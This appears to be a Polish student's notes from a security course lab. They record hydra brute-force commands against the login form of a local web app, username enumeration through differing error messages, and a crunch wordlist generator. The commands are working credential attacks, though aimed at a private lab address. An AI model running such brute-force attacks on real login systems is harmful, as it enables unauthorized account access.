@@ -1,0 +1,17 @@
+cd /cygdrive/c/Users/macie/Desktop/Studia/"Semestr 3"/BAIiM/Projetk
+
+http://192.168.0.36:5000
+
+hydra -t 64 -l user1 -P 3-znaki-mix.txt -s 5000 192.168.0.36 http-post-form "/login:username=^USER^&password=^PASS^:Blad uzytkownika lub hasla"
+
+Dobra odpaliłem sobie to i od razu mogę powiedzieć jedną rzecz. Trzeba to -t ustawić na jakieś 32 albo nawet lepiej 64 bo wtedy są odpalane wątki i dzięki temu proces znacznie przyspiesza, dosłownie w 30 sekund łamie to hasło.
+
+Etap 1
+hydra -t 64 -L common_usernames.txt -p haslo -s 5000 192.168.0.36 http-post-form "/login:username=^USER^&password=^PASS^:Nie ma takiego uzytkownika"
+hydra -t 64 -l user1 -P common_passwords.txt -s 5000 192.168.0.36 http-post-form "/login:username=^USER^&password=^PASS^:Nieprawidlowe haslo"
+
+Etap 2
+goy@!
+Niech regex R = agresoy!@#$%
+./crunch 4 4 'agresoy!@#$%' -o regex.txt
+hydra -t 64 -l user1 -P regex.txt -s 5000 192.168.0.36 http-post-form "/login:username=^USER^&password=^PASS^:Blad uzytkownika lub hasla"
